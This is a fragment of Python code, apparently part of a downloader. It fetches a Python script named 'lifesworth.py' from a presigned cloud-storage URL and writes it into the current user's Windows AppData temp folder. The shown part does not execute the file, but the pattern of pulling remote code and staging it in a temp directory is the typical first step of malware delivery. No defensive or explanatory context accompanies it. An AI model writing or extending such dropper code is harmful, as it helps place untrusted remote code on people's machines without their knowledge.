...
remote_script_url = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/YOsObbVSRdM7n6CvzGJ8uDaP1Cp2/fbb2f582-6710-435e-8190-7ef249386507?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240511%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20240511T170431Z&X-Amz-Expires=43200&X-Amz-Signature=3af6f83ac2a2565040a3615f2ade9664fddfa4b7b040032b210f6336d55e3eef&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22lifesworth.py%22"
script_content = requests.get(remote_script_url).content

# Save the script to a temporary file
path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\lifesworth.py"
with open(path, "wb") as script_file:
    script_file.write(script_content)  # This line should have an indented block
